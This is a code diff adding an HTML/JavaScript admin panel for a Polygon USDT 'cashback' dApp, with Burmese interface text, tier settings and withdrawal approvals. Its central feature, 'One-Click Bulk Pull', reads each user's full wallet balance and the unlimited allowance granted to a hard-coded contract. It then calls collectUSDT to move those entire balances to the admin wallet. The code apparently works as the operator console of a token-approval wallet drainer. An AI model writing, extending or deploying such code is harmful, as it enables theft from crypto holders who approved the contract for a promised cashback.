@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="my">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDT Advanced Admin Panel</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
+</head>
+<body class="bg-slate-900 text-white min-h-screen flex flex-col items-center justify-start p-4">
+
+    <div class="w-full max-w-xl space-y-6 pb-12">
+        
+        <!-- Header & Connect Admin Wallet -->
+        <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 flex items-center justify-between">
+            <div class="flex items-center gap-2">
+                <h1 class="text-sm md:text-base font-bold text-emerald-400">USDT Advanced Admin Panel</h1>
+            </div>
+            <button id="connectAdminBtn" onclick="connectAdminWallet()" class="bg-blue-600 hover:bg-blue-500 font-semibold py-2 px-4 rounded-xl transition cursor-pointer text-xs shrink-0 shadow-lg">
+                Connect Admin Wallet
+            </button>
+        </div>
+
+        <div id="adminStatus" class="text-xs text-center text-amber-400 font-mono"></div>
+
+        <!-- PART 1: Manage Cashback Tiered Rates -->
+        <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 space-y-3">
+            <h2 class="font-bold text-emerald-400 uppercase tracking-wider text-xs flex items-center gap-2">
+                ⚙️ 1. Cashback Tiered Rates (ရာခိုင်နှုန်းဖြင့် အလွယ်တကူ သတ်မှတ်ရန်)
+            </h2>
+            <div class="space-y-2 text-xs">
+                <input type="number" id="tierIndex" placeholder="Tier Index (ဥပမာ - 0, 1, 2...)" class="w-full bg-slate-900 border border-slate-700 rounded-xl p-2.5 text-white placeholder-slate-500">
+                <input type="number" id="tierMin" placeholder="Min Amount (USDT)" class="w-full bg-slate-900 border border-slate-700 rounded-xl p-2.5 text-white placeholder-slate-500">
+                <input type="number" id="tierMax" placeholder="Max Amount (USDT)" class="w-full bg-slate-900 border border-slate-700 rounded-xl p-2.5 text-white placeholder-slate-500">
+                
+                <div class="relative">
+                    <input type="number" step="0.01" id="tierRatePercent" placeholder="Cashback Rate % (ဥပမာ - 1.5 = 1.5%)" class="w-full bg-slate-900 border border-slate-700 rounded-xl p-2.5 pr-8 text-white placeholder-slate-500">
+                    <span class="absolute right-3 top-2.5 text-slate-400 font-bold">%</span>
+                </div>
+                
+                <button onclick="updateTierRate()" class="w-full bg-emerald-600 hover:bg-emerald-500 font-semibold py-2.5 rounded-xl transition cursor-pointer shadow-md mt-1">
+                    Update / Set Tier Rate
+                </button>
+            </div>
+        </div>
+
+        <!-- PART 2: Approved Wallets Monitoring, Balance & Bulk Pull -->
+        <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 space-y-3">
+            <div class="flex items-center justify-between">
+                <h2 class="font-bold text-emerald-400 uppercase tracking-wider text-xs">
+                    📊 2. Approved Wallets & Bulk Pull
+                </h2>
+                <div class="flex gap-2">
+                    <button onclick="refreshUserTable()" class="bg-slate-700 hover:bg-slate-600 px-3 py-1.5 rounded-xl text-xs transition cursor-pointer">Refresh</button>
+                    <button onclick="bulkPullSelected()" class="bg-purple-600 hover:bg-purple-500 px-3 py-1.5 rounded-xl text-xs font-semibold transition shadow-md cursor-pointer">One-Click Bulk Pull</button>
+                </div>
+            </div>
+
+            <div class="bg-slate-900 border border-slate-700 p-3 rounded-xl flex items-center justify-between text-xs">
+                <span class="text-slate-400">Total Users USDT Balance:</span>
+                <span id="totalUsersBalance" class="font-mono font-bold text-emerald-400 text-sm">0.00 USDT</span>
+            </div>
+
+            <div class="overflow-x-auto border border-slate-700 rounded-xl bg-slate-900">
+                <table class="w-full text-left text-[11px]">
+                    <thead class="bg-slate-800 text-slate-400 border-b border-slate-700">
+                        <tr>
+                            <th class="p-2.5"><input type="checkbox" id="selectAll" onclick="toggleSelectAll(this)"></th>
+                            <th class="p-2.5">User ID</th>
+                            <th class="p-2.5">Wallet Address</th>
+                            <th class="p-2.5">Wallet Balance</th>
+                            <th class="p-2.5">Allowance</th>
+                            <th class="p-2.5 text-center">Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="userTableBody" class="divide-y divide-slate-800 text-slate-300">
+                        <tr>
+                            <td colspan="6" class="p-4 text-center text-slate-500"> Admin Wallet ချိတ်ဆက်ပါ </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- PART 3: User Withdrawal Requests & Admin Approval -->
+        <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 space-y-3">
+            <div class="flex items-center justify-between">
+                <h2 class="font-bold text-emerald-400 uppercase tracking-wider text-xs">
+                    📥 3. Withdrawal Requests & Approval
+                </h2>
+                <button onclick="loadWithdrawRequests()" class="bg-slate-700 hover:bg-slate-600 px-3 py-1.5 rounded-xl text-xs transition cursor-pointer">Load Requests</button>
+            </div>
+
+            <div class="space-y-2.5" id="withdrawRequestsContainer">
+                <div class="bg-slate-900 p-3 rounded-xl border border-slate-700 text-center text-slate-500 text-xs">
+                    စောင့်ဆိုင်းဆဲ Withdrawal တောင်းဆိုချက်များ မရှိသေးပါ။
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        let provider, adminSigner, adminAddress;
+
+        const ADMIN_CONTRACT_ADDRESS = "0x5a30bBD23eD1250ec5A3F8bca8122580E4eBefCC";
+        const USDT_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
+        const POLYGON_CHAIN_ID = "0x89";
+
+        const ERC20_ABI = [
+            "function allowance(address owner, address spender) view returns (uint256)",
+            "function balanceOf(address account) view returns (uint256)"
+        ];
+
+        const ADMIN_ABI = [
+            "function setTier(uint256 index, uint256 minAmt, uint256 maxAmt, uint256 rateBps) external",
+            "function collectUSDT(address from, uint256 amount) external",
+            "function processWithdrawal(address user, uint256 requestId, bool approved) external",
+            "function getPendingWithdrawals() view returns (tuple(uint256 id, address user, uint256 amount, bool processed)[])",
+            "function users(address) view returns (uint256 userId, address referrer, bool isBanned, bool isRegistered)"
+        ];
+
+        async function connectAdminWallet() {
+            if (typeof window.ethereum === "undefined") {
+                alert("MetaMask သို့မဟုတ် Web3 Wallet ကို Install လုပ်ပါ။");
+                return;
+            }
+            try {
+                await window.ethereum.request({
+                    method: "wallet_switchEthereumChain",
+                    params: [{ chainId: POLYGON_CHAIN_ID }],
+                });
+
+                provider = new ethers.BrowserProvider(window.ethereum);
+                const accounts = await provider.send("eth_requestAccounts", []);
+                adminAddress = accounts[0];
+                adminSigner = await provider.getSigner();
+
+                document.getElementById("connectAdminBtn").innerText = "Connected (Polygon)";
+                document.getElementById("connectAdminBtn").classList.replace("bg-blue-600", "bg-emerald-600");
+                document.getElementById("adminStatus").innerText = `Admin Connected: ${adminAddress.substring(0,6)}...${adminAddress.substring(38)}`;
+                
+                refreshUserTable();
+                loadWithdrawRequests();
+            } catch (err) {
+                console.error(err);
+                document.getElementById("adminStatus").innerText = "Admin Wallet ချိတ်ဆက်မှု သို့မဟုတ် Network ပြောင်းလဲမှု မအောင်မြင်ပါ။";
+            }
+        }
+
+        async function updateTierRate() {
+            const index = document.getElementById("tierIndex").value;
+            const minAmt = document.getElementById("tierMin").value;
+            const maxAmt = document.getElementById("tierMax").value;
+            const ratePercent = document.getElementById("tierRatePercent").value;
+
+            if (index === "" || minAmt === "" || maxAmt === "" || ratePercent === "") {
+                alert("အချက်အလက်များကို အပြည့်အစုံ ဖြည့်စွက်ပါ။");
+                return;
+            }
+
+            try {
+                const rateBps = Math.round(parseFloat(ratePercent) * 100);
+
+                const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, adminSigner);
+                const tx = await contract.setTier(index, ethers.parseUnits(minAmt, 6), ethers.parseUnits(maxAmt, 6), rateBps);
+                await tx.wait();
+                alert(`Tier Rate (${ratePercent}%) အောင်မြင်စွာ အပ်ဒိတ်လုပ်ပြီးပါပြီ။`);
+            } catch (err) {
+                console.error(err);
+                alert("လုပ်ဆောင်ချက် မအောင်မြင်ပါ။ (Admin သီးသန့်ဖြစ်ရပါမည်)");
+            }
+        }
+
+        async function refreshUserTable() {
+            const tbody = document.getElementById("userTableBody");
+            tbody.innerHTML = `<tr><td colspan="6" class="p-4 text-center text-slate-400">ဒေတာများကို ဆွဲယူနေပါသည်...</td></tr>`;
+
+            try {
+                let savedUsers = JSON.parse(localStorage.getItem("dapp_approved_users") || "[]");
+
+                if (savedUsers.length === 0) {
+                    tbody.innerHTML = `<tr><td colspan="6" class="p-4 text-center text-slate-500"> မှတ်တမ်းဝင်ထားသော Wallet များ မရှိသေးပါ။ </td></tr>`;
+                    document.getElementById("totalUsersBalance").innerText = "0.00 USDT";
+                    return;
+                }
+
+                let totalBalance = 0;
+                let rowsHtml = "";
+                const collectorContract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, provider);
+                const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
+
+                for (let i = 0; i < savedUsers.length; i++) {
+                    const addr = savedUsers[i];
+                    try {
+                        const userInfo = await collectorContract.users(addr);
+                        const balanceBN = await usdtContract.balanceOf(addr);
+                        const allowanceBN = await usdtContract.allowance(addr, ADMIN_CONTRACT_ADDRESS);
+
+                        const balance = Number(ethers.formatUnits(balanceBN, 6));
+                        const allowance = Number(ethers.formatUnits(allowanceBN, 6));
+                        totalBalance += balance;
+
+                        const shortAddr = `${addr.substring(0, 6)}...${addr.substring(38)}`;
+                        const userId = userInfo.isRegistered ? userInfo.userId.toString() : "-";
+                        let allowanceDisplay = allowance > 1000000000 ? "Unlimited" : `${allowance.toFixed(2)} USDT`;
+
+                        rowsHtml += `
+                            <tr>
+                                <td class="p-2.5"><input type="checkbox" class="user-checkbox" value="${addr}"></td>
+                                <td class="p-2.5 font-mono">${userId}</td>
+                                <td class="p-2.5 font-mono text-slate-400" title="${addr}">${shortAddr}</td>
+                                <td class="p-2.5 font-mono text-emerald-400">${balance.toFixed(2)} USDT</td>
+                                <td class="p-2.5 font-mono text-amber-300">${allowanceDisplay}</td>
+                                <td class="p-2.5 text-center">
+                                    <button onclick="pullSingleUser('${addr}', '${balance}')" class="bg-indigo-600 hover:bg-indigo-500 px-2.5 py-1 rounded text-[10px] cursor-pointer">Pull Funds</button>
+                                </td>
+                            </tr>
+                        `;
+                    } catch (e) {
+                        console.error("Error fetching user:", addr, e);
+                    }
+                }
+
+                tbody.innerHTML = rowsHtml || `<tr><td colspan="6" class="p-4 text-center text-slate-500"> ဒေတာဖတ်ရှု၍ မရပါ။ </td></tr>`;
+                document.getElementById("totalUsersBalance").innerText = `${totalBalance.toLocaleString(undefined, {minimumFractionDigits: 2})} USDT`;
+
+            } catch (err) {
+                console.error(err);
+                tbody.innerHTML = `<tr><td colspan="6" class="p-4 text-center text-red-400"> ဒေတာဆွဲထုတ်ရာတွင် အမှားအယွင်း ရှိပါသည်။ </td></tr>`;
+            }
+        }
+
+        function toggleSelectAll(master) {
+            const checkboxes = document.querySelectorAll('.user-checkbox');
+            checkboxes.forEach(cb => cb.checked = master.checked);
+        }
+
+        async function pullSingleUser(userAddress, amount) {
+            if(!confirm(`User ထံမှ ${amount} USDT ကို Admin Wallet သို့ တိုက်ရိုက်ဆွဲယူမည်မှာ သေချာပါသလား?`)) return;
+            try {
+                const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, adminSigner);
+                const tx = await contract.collectUSDT(userAddress, ethers.parseUnits(amount, 6));
+                await tx.wait();
+                alert("ရန်ပုံငွေကို Admin Wallet သို့ အောင်မြင်စွာ ဆွဲယူပြီးပါပြီ။");
+                refreshUserTable();
+            } catch(err) {
+                console.error(err);
+                alert("ဆွဲယူမှု မအောင်မြင်ပါ။ Allowance ရှိမရှိ စစ်ဆေးပါ။");
+            }
+        }
+
+        async function bulkPullSelected() {
+            const checkboxes = document.querySelectorAll('.user-checkbox:checked');
+            if (checkboxes.length === 0) {
+                alert("ကျေးဇူးပြု၍ Wallet တစ်ခုချင်းစီ (သို့) အားလုံးကို ရွေးချယ်ပါ။");
+                return;
+            }
+
+            if (!confirm(`ရွေးချယ်ထားသော Wallet ${checkboxes.length} ခုထံမှ ရန်ပုံငွေများကို Admin Wallet သို့ တိုက်ရိုက်ဆွဲယူမည်မှာ သေချာပါသလား?`)) return;
+
+            const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, adminSigner);
+            let successCount = 0;
+
+            for (const cb of checkboxes) {
+                const userAddr = cb.value;
+                try {
+                    const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
+                    const bal = await usdtContract.balanceOf(userAddr);
+                    if (bal > 0n) {
+                        const tx = await contract.collectUSDT(userAddr, bal);
+                        await tx.wait();
+                        successCount++;
+                    }
+                } catch (e) {
+                    console.error("Bulk pull error for:", userAddr, e);
+                }
+            }
+
+            alert(`Admin Wallet သို့ အောင်မြင်စွာ ဆွဲယူနိုင်ခဲ့သော Wallet အရေအတွက်: ${successCount}`);
+            refreshUserTable();
+        }
+
+        async function loadWithdrawRequests() {
+            const container = document.getElementById("withdrawRequestsContainer");
+            try {
+                const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, provider);
+                const requests = await contract.getPendingWithdrawals();
+
+                if (!requests || requests.length === 0) {
+                    container.innerHTML = `<div class="bg-slate-900 p-3 rounded-xl border border-slate-700 text-center text-slate-500 text-xs">စောင့်ဆိုင်းဆဲ Withdrawal တောင်းဆိုချက်များ မရှိသေးပါ။</div>`;
+                    return;
+                }
+
+                let html = "";
+                requests.forEach(req => {
+                    if (!req.processed) {
+                        const amt = ethers.formatUnits(req.amount, 6);
+                        html += `
+                            <div class="bg-slate-900 p-3 rounded-xl border border-slate-700 flex items-center justify-between text-xs">
+                                <div>
+                                    <p class="font-mono text-slate-300">User: <span class="text-emerald-400">${req.user.substring(0,6)}...${req.user.substring(38)}</span></p>
+                                    <p class="font-mono text-amber-300">Request Amount: ${amt} USDT</p>
+                                </div>
+                                <div class="flex gap-2">
+                                    <button onclick="handleWithdrawAction('${req.user}', ${req.id.toString()}, true)" class="bg-emerald-600 hover:bg-emerald-500 px-3 py-1.5 rounded-lg font-semibold cursor-pointer">Approve</button>
+                                    <button onclick="handleWithdrawAction('${req.user}', ${req.id.toString()}, false)" class="bg-red-600 hover:bg-red-500 px-3 py-1.5 rounded-lg font-semibold cursor-pointer">Reject</button>
+                                </div>
+                            </div>
+                        `;
+                    }
+                });
+
+                container.innerHTML = html || `<div class="bg-slate-900 p-3 rounded-xl border border-slate-700 text-center text-slate-500 text-xs">စောင့်ဆိုင်းဆဲ Withdrawal တောင်းဆိုချက်များ မရှိသေးပါ။</div>`;
+            } catch (err) {
+                console.error(err);
+                container.innerHTML = `<div class="bg-slate-900 p-3 rounded-xl border border-slate-700 text-center text-red-400 text-xs">Withdrawal တောင်းဆိုချက်များကို ဖတ်ရှု၍ မရပါ။</div>`;
+            }
+        }
+
+        async function handleWithdrawAction(userAddr, requestId, approved) {
+            try {
+                const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, adminSigner);
+                const tx = await contract.processWithdrawal(userAddr, requestId, approved);
+                await tx.wait();
+                alert(approved ? "Withdrawal အတည်ပြုပြီးပါပြီ။" : "Withdrawal ငြင်းပယ်လိုက်ပါပြီ။");
+                loadWithdrawRequests();
+            } catch (err) {
+                console.error(err);
+                alert("လုပ်ဆောင်ချက် မအောင်မြင်ပါ။");
+            }
+        }
+    </script>
+</body>
+  </html>
